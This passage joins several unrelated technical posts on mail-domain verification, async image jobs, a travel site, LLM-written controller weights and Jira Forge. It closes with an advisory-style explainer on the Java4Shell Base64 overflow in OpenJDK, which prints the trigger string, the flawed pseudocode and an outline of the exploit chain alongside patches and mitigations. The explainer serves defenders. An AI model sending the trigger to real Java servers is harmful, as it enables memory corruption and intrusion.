    return "", false
}

func run() error {
    key := os.Getenv("INFRAI_API_KEY")
    target := strings.TrimSpace(os.Getenv("CLINIC_DOMAIN"))
    if key == "" || target == "" {
        return fmt.Errorf("set INFRAI_API_KEY and CLINIC_DOMAIN")
    }
    ctx, cancel := context.WithTimeout(context.Background(), 90*time.Second)
    defer cancel()
    client := &http.Client{
        Timeout: 20 * time.Second,
        CheckRedirect: func(_ *http.Request, _ []*http.Request) error {
            return http.ErrUseLastResponse
        },
    }
    inventory, err := get(ctx, client, key, "/dns/domain/list")
    if err != nil {
        return err
    }
    var decoded any
    if err := json.Unmarshal(inventory, &decoded); err != nil {
        return fmt.Errorf("decode DNS inventory: %w", err)
    }
    domain, found := findDomain(decoded, target)
    if !found {
        return fmt.Errorf("domain absent from this response; inspect the published schema and inventory scope")
    }
    mail, err := get(ctx, client, key, "/email/domain/get/"+url.PathEscape(domain))
    if err != nil {
        return err
    }
    fmt.Printf("DNS inventory matched %s; mail configuration follows. This is not delivery proof.\n%s\n", domain, mail)
    return nil
}

func main() {
    if err := run(); err != nil {
        fmt.Fprintln(os.Stderr, err)
        os.Exit(1)
    }
}

The program bounds each request at 20 seconds and the inspection at 90 seconds, retries rate limiting with exponential backoff while respecting Retry-After, and returns other unsuccessful responses with their bodies. These are local engineering choices, not service latency claims. It also refuses redirects so the bearer credential stays at the intended API origin.

Notice the limited success condition: the program retrieves mail configuration for a domain observed in the DNS response. That's the handoff. It doesn't publish records or traverse an unspecified inventory pagination contract. Before using it across a fleet, inspect discovery for the inventory's scope and the response schemas. The schema and observed response determine the next check, not a guessed property named ready.

Step 3 — Promote configuration only as far as the evidence allows

Run the inspection after the responsible party has made the DNS change. For platform-managed zones, also read the actual records back after writing; an inventory match cannot substitute for that readback. For clinic-managed zones, keep the copy instructions available until verification establishes the required configuration. During a DKIM rotation, the comparison must concern the current mail configuration, rather than a value copied into an old onboarding ticket.

SPF, DKIM, and DMARC address mail authentication; DMARC makes alignment and policy relevant to interpreting the result. RFC 7489 is the reference for that distinction. Don't turn DNS verification into an inbox-placement promise. Calling the clinic's mail delivery operational needs delivery evidence from the mail workflow as well as configuration evidence.

The executable inspection gives an operator the mail-domain response to review. It prints no “activated” message. For a production activation gate, bind the published schemas to explicit checks and retain the domain, current required records, observed records, and verification outcome in your application's evidence trail. Define what delivery evidence your SLO requires before making a customer-facing claim.

That decision is local.

An incomplete check should leave a truthful state: waiting for clinic action, awaiting verification, or configuration observed with delivery unconfirmed. This prevents a successful configuration write from becoming an accidental claim about appointment-message delivery.

Buy versus build at the DNS-to-mail seam

Compare who operates the handoff. These are choices for evaluating that boundary, not measured deliverability rankings. No delivery benchmark establishes a winner here.

Approach What it buys What remains your team's job
Infrai DNS plus email Both capability groups share one key and REST surface; discovery supplies schemas and examples Establish zone access, map evidence to UI states, and evaluate delivery
Amazon Route 53 plus Amazon SES A direct DNS-and-mail pairing to evaluate for an AWS-centered platform Connect DNS changes to mail verification and maintain the customer-held-domain branch
Cloudflare plus Resend A DNS-and-mail pairing to evaluate when the team wants separate services Carry mail requirements into DNS, correlate verification, and reconcile ownership
Existing DNS provider plus a mail specialist Lets a clinic retain its DNS operator while the platform chooses mail tooling Supply copy instructions and operate the verification and support loop

Cloudflare plus Resend entails two service signups and two service credential sets. Route 53 plus SES can live under one AWS account; it would be misleading to insist that this necessarily requires two signups or independent credential sets, although DNS and mail permissions and their connecting application logic still need attention. The glue in either pairing is the same work: associate a clinic domain with mail requirements, publish where authorized, read back, verify, and keep the UI synchronized when requirements change.

Infrai has a limitation at the ownership boundary: a shared key doesn't authorize writes to clinic-held zones. A specialist or direct pairing is the better choice when the organization already operates that stack well or needs mail-specific controls to evaluate directly. Existing runbooks and permissions are assets. Replacing them merely to reduce dashboard tabs can increase the effective operating bill.

The combined approach concentrates trust, billing, and the outage surface in one vendor. Weigh that trade-off against the integration work it removes. For this rollout, the cost model includes maintaining the handoff, verification during rotations, support for the 20 clinic-held zones, and downstream mail investigation; a per-call leaderboard leaves most of the decision unpriced.

Sources

References for the authentication boundary and alternative service pairings:

  • DMARC specification
  • Amazon Route 53 documentation
  • Amazon SES documentation
  • Cloudflare DNS documentation
  • Resend domain documentation

If this ownership boundary fits your platform, start with the schemas and examples in the Infrai documentation, then make activation depend on the evidence your clinic-facing promise requires.

title: Three States for Async Product Image Jobs: Accepted, Downloaded, Approved
description:
AI-generated tutorial from CartVisual, based on the cited vendor documentation. The job states below are an illustrative integration design.

An image-edit job can be accepted before the edited file exists. In a catalog pipeline, confusing those events can cause two problems: a duplicate paid request when polling is slow, or a broken SKU image when a status URL ends up in the asset table.

Keep the job receipt separate from the asset

Store the provider job ID and the immutable source revision together as soon as the API acknowledges the request. Keep the lookup URL in the task record. Claid’s async image-editing documentation, for example, distinguishes the task lookup from the completed result’s output object. If the response does not include a lookup URL, the documented route also accepts the task ID.

Make the merchant approval a distinct transition

Transition Required evidence
Submitted to accepted A provider job ID that can be looked up
Accepted to downloaded A completed response and a file your worker actually read
Downloaded to approved A check against the SKU, dimensions and source reference

If polling times out after acceptance, keep the receipt and reconcile that job. A local timeout does not tell you that the provider stopped. If the download fails after completion, retry the download according to the provider’s documented access and expiry rules. Both paths avoid submitting another generation merely to recover a file.

A useful test for your worker

Create a fake status response pointing to a fake task lookup. Assert that the worker never writes that URL into the product’s live image field. Then feed it a completed response with a fixture file and confirm that the file reaches a review state. You can test both branches with local fixtures and without making a paid provider request.

For a worked Claid example and the documented field names, see CartVisual’s async image handoff guide and the official Claid async API reference.

title: How We Built 'The Travel Tales': High-Performance Travel Publishing with Next.js 15 & React
description:
How We Built 'The Travel Tales': High-Performance Travel Publishing with Next.js 15 & React

Originally engineered by Kahol Labs — Live Platform: thetraveltales.kahollabs.in

The modern web is inundated with travel blogs that have succumbed to ad-tech bloat: full-screen video popups, intrusive newsletter overlays, and megabytes of JavaScript that render reading unbearable on a spotty 3G cellular connection in the Himalayas.

When we set out to build The Travel Tales, our goal was to engineer a fast, distraction-free sanctuary where mountaineers, road-trippers, and backpackers could discover and chronicle real journeys.

In this engineering breakdown, we dive into how we architected thetraveltales.kahollabs.in using Next.js 15, React Server Components (RSC), and Tailwind CSS.

1. Zero-JS Reading Paths with React Server Components

For a travel storytelling website, reader experience and fast time-to-first-byte (TTFB) are non-negotiable. Travel readers often browse articles while in transit—on buses, mountain passes, and remote homestays with unstable mobile connections.

By leveraging Next.js 15 App Router and React Server Components:

  • Static Content Stays on the Server: Story paragraphs, destination overviews, and itinerary metadata are rendered into lightweight HTML on the server.
  • Client Hydration is Minimized: Client-side JavaScript bundles are stripped down strictly to interactive widgets (search filters, bookmarks, and sharing buttons).
  • Sub-Second First Contentful Paint: Lighthouse performance scores hit 98+ on mobile devices.

Explore the live production website: https://thetraveltales.kahollabs.in.

2. Responsive Visual Storytelling & Image Optimization

Travel chronicles demand breathtaking photography—from high-altitude passes in Spiti Valley to secluded Kyoto alleyways. However, high-resolution DSLR photos easily exceed 15MB each, which would instantly crash a budget mobile browser.

We engineered an automated responsive asset pipeline:

  1. Next.js Dynamic Image Resizing: Photos are transcoded on-the-fly into modern WebP and AVIF formats based on the client viewport.
  2. Priority LCP Preloading: The above-the-fold hero photo is statically preloaded with priority={true}, while secondary gallery shots load lazily with blurry placeholder previews.
  3. Responsive Grid Layouts: Built with utility-first Tailwind CSS to maintain seamless aspect ratios across smartphone screens, tablets, and 4K desktop displays.

3. SEO & Structured Schema Architecture

To ensure authentic travel chronicles rank against generic corporate travel agencies on Google, The Travel Tales embeds comprehensive structured data:

  • Article & BlogPosting Schema: Open-standard JSON-LD describing author attribution, publication dates, and headline metadata.
  • BreadcrumbList Schema: Clean hierarchical navigation paths for Google Search indexers.
  • OpenGraph & Twitter Card Metadata: Auto-generated visual cards for rich link previews when readers share chronicles across WhatsApp, X, and Reddit.

Summary & Next Steps

Building The Travel Tales demonstrates that modern web publishing doesn't have to choose between rich visuals and blazing speed. With thoughtful architecture, clean component boundaries, and Next.js 15, we can deliver an extraordinary reader experience.

  • Detailed Case Study: Kahol Labs Portfolio — The Travel Tales
  • Engineered by: Kahol Labs — Independent Software & Technology Engineering Studio.

title: Weight-space programming for tractor guidance controller: large language models natively write neural network weights that steer a real tractor
description:
arXiv:2611.21958v1 Announce Type: new 
Abstract: Weight-space programming is a process where a large language model reads and writes the weights of a neural network directly, guided by a natural language specification, without an optimiser or gradient descent. This study applies it to automatic tractor guidance, where a 253-parameter neural network steers along paths of lines and arcs and must be adapted when the machine changes, such as a slower steering actuator. GPT-6 Astra and Claude Fable 5.1 (also 5.2) edited the network for our research tractor using a small budget of simulated evaluations to repair a network trained for another tractor and write a controller into a network with zero weights. We compared them with an evolution strategy, gradient descent and pure pursuit in simulation and on the real tractor. Both models read the network and analysed the closed loop with control theory correctly, and Fable's repair without simulation succeeded only occasionally. With simulated feedback, both models repaired the trained network in single sessions and wrote a working controller from zero weights, whereas from zero the evolution strategy found none. The controllers written from zero were sparse and in a classical cascaded structure; one model edited the trained network while the other replaced it. Gradient descent reached higher accuracy with far more simulation, and all language model controllers steered the real tractor without intervention, with errors of the same order as pure pursuit. Language models can program the weights of a neural controller directly, much as control engineers design one. We call this Weight-Space Engineering.

title: Building a Gherkin editor and two-way Git sync on Atlassian Forge: eight things I learned
description:
I spent October and November 2026 building Gherkin Studio, a BDD app for Jira Cloud, on Atlassian Forge. It lets a team write Gherkin scenarios inside a Jira story, syncs the .feature files both ways with GitHub, GitLab.com or Bitbucket Cloud, and shows CI results on each story. Atlassian approved it on the Marketplace on 18 November.

Forge runs your code on Atlassian's infrastructure, so there is no server to keep alive. It also has limits you only meet once real data arrives. These are the eight that cost me the most time, with the numbers I measured.

1. One storage value holds at most 240 KiB

Forge's key-value storage refuses any single value over 240 KiB. That sounds generous until you store a whole story's scenarios in one value, or an index of every step your team has written (for autocomplete), or a CI result for a story with hundreds of scenarios.

What I did: every place that writes a value now checks its size in bytes first, and my local test double of Forge storage refuses anything over 240 KiB, so the limit fails in tests instead of in production. The step index is capped by bytes, not by count.

2. A web trigger that takes too long gets a 424

CI pipelines post a Cucumber JSON report to a Forge web trigger. My first version checked each story in the report one after another. With 500 stories that took 56 seconds, and Forge stopped the trigger with HTTP 424.

Checking ten stories at a time (a small mapLimit helper, no library) brought the same 500 stories down to 6.7 seconds. Forge also refuses request bodies around 6 MB with a 413; 4.5 MB went through.

3. Slow work belongs in a queue, not in a resolver

The optional AI drafts call the Anthropic API. A short story took 16–20 seconds; a detailed one took more than 22, which is too long for a UI resolver. The call now runs in a Forge async event consumer with timeoutSeconds: 300, and the panel polls for the result. A long story takes about 40 seconds and nothing times out.

One trap: Forge retries an async event after an error or a timeout. Since the API call costs money, the job is marked as running before the paid call, so a retry does not pay twice.

4. Each Git host says "conflict" differently

Two-way sync means detecting when the file in Git changed since the last sync. The three hosts report a stale write in three ways:

  • GitHub: 409 when the file's SHA is stale; 422 when the SHA is missing.
  • GitLab: 400, with a message such as "changed since you started editing it".
  • Bitbucket Cloud: 400, "The parent commit specified (…) is not the head of branch". Not 409.

All three answer 404 for a missing file, but also for a missing branch or repository. So before telling a user "the file was deleted in Git", the app tests the connection.

When both sides changed, nothing is overwritten. The app shows a line-by-line diff and the user picks Jira's version, Git's version or the text in the editor.

5. Jira can stop showing a module without an error

My status panel used jira:issueGlance. During review it simply stopped appearing on my test site, even with the old manifest. The docs now say the glance is replaced by the issue context module. Moving to jira:issueContext, with the same dynamic properties, brought it back under "Apps" on the story. I kept the glance for older views.

6. Deleting a story sends more events than the docs suggest

When an issue is deleted, the app removes that story's data in a trigger on avi:jira:deleted:issue. The docs say cascading events are not emitted, but a subtask deleted together with its parent did get its own event on my site. Deleting a whole project is a single avi:jira:deleted:project event, with no list of its issues.

7. Licensing exists only in production

context.license is only present in the production environment of a paid app. In development and staging it is undefined, so the code treats "undefined" as licensed and only "inactive" as read-only. You can test the inactive path by installing on a separate developer site with an inactive license.

8. The free compute is large

Forge includes 200,000 GB-seconds a month per app. A month of heavy testing on my site used 282. For a small app, compute cost is not the problem; storage limits and timeouts are.

What I would do again

  • Fake Forge storage locally with the real limits, so tests fail where production would.
  • Measure with real data before choosing a design. Every limit above showed up only with realistic sizes.
  • Read what each Git host actually returns instead of what the docs imply.

If you build on Forge and hit something I missed, I'd like to hear it in the comments.

I'm the developer of Gherkin Studio, the app described here. It's on the Atlassian Marketplace, free for up to 10 users. This post first appeared on gherkinstudio.com.

title: Java4Shell (CVE-2026-114938): is your Java server affected?
description:
Java4Shell is the nickname for CVE-2026-114938, a memory-corruption bug in the Base64 decoder that OpenJDK uses on x86-64 machines with AVX-512 VBMI. The security group Calif says a 65-character string, 64 letter A's followed by an equals sign, makes the decoder write 62 bytes past the end of a 50-byte array. OpenJDK and Oracle published fixes on November 17. If you run Java 17 or newer, the question is whether any of your servers can reach the broken code path, and that takes about four checks.

TL;DR

  • Calif reports that OpenJDK's AVX-512 Base64 decoder writes 64 bytes into a 50-byte array for a 65-character padded input, so 62 bytes land past the end. Java rejects the input afterwards, which is too late.
  • Scope: OpenJDK 17.0.6 and newer on x86-64 CPUs with AVX-512 VBMI (Intel Ice Lake or later, AMD Zen 4 or later). ARM64 is not affected. Standard Java 8 and 11 are not on this CVE.
  • OpenJDK and Oracle list it at CVSS 3.1 8.1; Calif scores it 9.2 on CVSS 4.0. Fixed builds exist from Oracle and Amazon Corretto, and Temurin is releasing as testing finishes.
  • Calif says it reached code execution in eleven products. Those are Calif's own tests, the recipes are withheld, and Calif says there is no universal exploit.
  • The mitigation that works everywhere is -XX:-UseBASE64Intrinsics. When I checked on November 18, the CVE was not on CISA's Known Exploited Vulnerabilities list.

What is Java4Shell (CVE-2026-114938)?

Base64 packs three bytes into four text characters. It shows up in login headers, file uploads and network messages, so almost every Java server decodes it somewhere. To decode it faster, HotSpot, the JVM inside OpenJDK, can swap in a hand-written assembly routine once a decode call site has been compiled by C2, the optimizing JIT compiler. The routine uses AVX-512 VBMI instructions to process 64 bytes at a time.

Calif, a security research group, found the bug in that routine. Its write-up credits Quang Luong, who says he told the Codex coding agent to audit the JIT compiler, intrinsics, widely used APIs and cryptography. Most of what came back was junk, he says, and then it flagged the Base64 decoder. Calif says it took one hour to find the bug and two more hours to build the first working exploit, for under $200 in tokens. I have not verified any of that; it is Calif's account. Calif is also the team behind PHP2Shell, which I covered on October 22.

How does the Base64 overflow work?

Take the published trigger: 64 letter A's followed by one equals sign.

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=

(On older OpenJDK 17 builds Calif says the trigger is 128 A's plus the equals sign.) Sixty-four A's decode to 48 bytes. With the padding character, Java reserves a 50-byte result array for the 65-character input. The assembly handles the final tail with one 64-byte store and a mask that says which bytes to write. Calif's pseudocode shows where it goes wrong:

output_len := (input_length / 4) * 3
if input[input_length - 1] == '=':
    output_len -= 1
output_mask := bzhiq(-1, output_len)

For a one-character tail the first line gives zero, the padding branch subtracts one, and the length becomes minus one. The mask instruction bzhiq does not clip an index of 64 or more, so the mask comes out as all ones and the store writes all 64 bytes. The store starts at offset 48 of a 50-byte array, so 62 bytes land past the end, on whatever object the allocator placed next door. Only then does Java notice the input is malformed and throw IllegalArgumentException. The error is correct and it is late.

The fix in public OpenJDK is small. The November security branch (pull request 33936, CSPU26_11) contains a four line change in stubGenerator_x86_64.cpp, committed under the title "Base64 optimization improvements". It adds a check that sends padded tails shorter than four characters to the Java code instead:

+    // A padded Base64 tail shorter than one complete block is handled by Java.
+    __ cmpl(length, 4);
+    __ jcc(Assembler::less, L_bruteForce);

OpenJDK's advisory does not name this commit; I tie it to the CVE by its place in the security branch and by how well it matches Calif's description.

From a fixed spill to code execution: what Calif claims

The spill is mostly a constant pattern, and only its landing position is controllable. Calif says it aims the spill at the length field of a neighboring array, which turns the fixed write into a bounded, chosen-value write. A second array whose length is corrupted and whose data is copied into the response becomes a heap read, which Calif compares to Heartbleed. From there Calif describes warming up the decoder until the JIT selects the fast path, an optional rehearsal round, the trigger, disclosure, repair of damaged objects and an application-specific final step.

Calif says its initial testing reached code execution in default configurations of Keycloak, Jira, Confluence, Artifactory, Jenkins and PingFederate without a login, and in Kafka brokers, Solr, Elasticsearch, Gerrit and Spinnaker after one. It also lists sample Struts and Spring Boot applications, and a client-side route in which a Java program opens a TLS connection to a malicious server. These are Calif's own results. The product recipes stay private until people have had time to patch, and I found no product advisory in the vendor pages I checked that confirms them.

Calif is open about the limits. There is no universal exploit; every target needs its own profile: a route to the decoder, a live writer, a way to read the result back, a heap layout and an application action. The attack is sensitive to network jitter, and Calif says it rented a server in the same cloud region as its target to reduce it. Some chains need request streaming, so a proxy that buffers the whole request body, such as nginx by default, removes their timing. Calif adds that this is not a general mitigation: Elasticsearch runs from a single complete request, so buffering does not stop that chain.

What is confirmed, and by whom?

  • Vendors. OpenJDK's advisory dated November 17 lists CVE-2026-114938 under hotspot/compiler at CVSS 3.1 8.1, affecting 17, 21, 25 and 27. Oracle's November Critical Security Patch Update lists the same score and credits Quang Luong of Calif.io. Oracle JDK 17.0.21.1 has a release date of November 17.
  • Distributions. Amazon's Linux Security Center shows Corretto 17, 21 and 25 packages as fixed on November 17. Adoptium says Temurin builds with the fix are being published as testing completes. Red Hat's bulletin says it is expediting fixes and that JVMs on ARM64, or on x86-64 CPUs without AVX-512 VBMI, are not known to be affected.
  • Government. CISA's alert of November 17 urges immediate patching and suggests validating Base64 input at the application boundary and limiting unauthenticated access as temporary controls.
  • Exploitation. The CVE was not in CISA's Known Exploited Vulnerabilities catalog (version 2026.11.17) when I checked on November 18. That says nothing about the future. The security firm Hadrian says it crashed Spring Security and Tomcat login checks on a Temurin 17 build in a lab, and reached code execution in a lab service that decodes request bodies; that is Hadrian's claim, and it says reliable code execution is very hard to reproduce.

Which of your servers can run the broken code?

Four conditions have to line up for a JVM to be in scope.

  1. An x86-64 chip with AVX-512 VBMI. Calif names Intel Ice Lake, Sapphire Rapids, Emerald Rapids and Granite Rapids, and AMD Zen 4 or newer. On Linux, Calif's check prints the relevant CPU flags: 
grep -m1 '^flags' /proc/cpuinfo | tr ' ' '\n' | grep -E '^(avx512f|avx512bw|avx512vbmi|bmi2)$'

All four flags must appear. A virtual machine sees the CPU features its hypervisor exposes, so run the check inside the guest that runs the JVM.

  1. A Java build in range. OpenJDK 17.0.6 and newer, which means Corretto, Temurin, Microsoft, Zulu, Liberica, SapMachine, Red Hat OpenJDK and Oracle builds that have not yet taken the fix. Standard Java 8 and 11 are not on this CVE; Oracle also lists its Java 8 performance build.
  2. A warmed-up decoder. The C2 compiler selects the routine only after the Base64 call site has been compiled, so a freshly started JVM is still on the Java implementation. Semgrep's detection README says AWS Lambda's Java bootstrap limits the JIT in a way that keeps the intrinsic unused by default; I have not verified that myself, so read it before relying on it.
  3. Input an attacker can reach. The vulnerable decoder has to receive attacker-controlled data, through an authentication header, an upload, a token or a message.

If any of the four is missing, the JVM is out of scope for this bug. You should still update, because the checks above depend on hardware that cloud providers and migrations change.

How do I fix or mitigate Java4Shell?

Option Works on Notes
Update to the fixed build for your Java line everything Oracle JDK 17.0.21.1 shipped on November 17; check your vendor for the matching Corretto, Temurin or distribution build
-XX:-UseBASE64Intrinsics every architecture disables the hardware Base64 routine; Aikido notes that programs decoding a lot of Base64 may run slower
-XX:UseAVX=2 x86-64 only disables AVX-512; OpenJDK on ARM does not recognize the flag and will fail to start
Rebuild container images containers patching the host leaves the JDK inside an old image as it was

Calif and Adoptium both recommend -XX:-UseBASE64Intrinsics as the interim control.

What Calif says we should delete

Calif's closing argument is that the fast decoder helps programs that decode enormous amounts of Base64, while everyone else carried the assembly too. It calls the cleanup vibe-uncoding, and the phrase is theirs; Calif notes that an apparently unused feature can have hidden dependencies.

Verdict: SHIP IT

I stamped the patch SHIP IT. It is small, public and already built by the main vendors, and the one flag works everywhere. Calif's code execution claims stay Calif's until someone else shows them, so update without panic and check which machines are actually in scope.

FAQ

Is Java4Shell exploited in the wild?

I found no source saying so. CISA urged patching, and the CVE was not on its Known Exploited Vulnerabilities list when I checked on November 18.

Does Java4Shell affect ARM and Graviton servers?

Calif, Red Hat and Amazon say ARM64 is not affected, because the vulnerable routine is x86-64 AVX-512 code. Do not set -XX:UseAVX=2 on ARM; the JVM will refuse to start.

Does it affect Java 8 and Java 11?

OpenJDK's advisory marks Java 17, 21, 25 and 27. Red Hat and Adoptium say Java 8 and 11 are not affected. Oracle separately lists its Java 8 performance build.

Is the 65-character string enough to take over a server?

Calif says the string only causes the overwrite. Turning it into code execution needed a separate, bespoke recipe for each product, which Calif has not published.
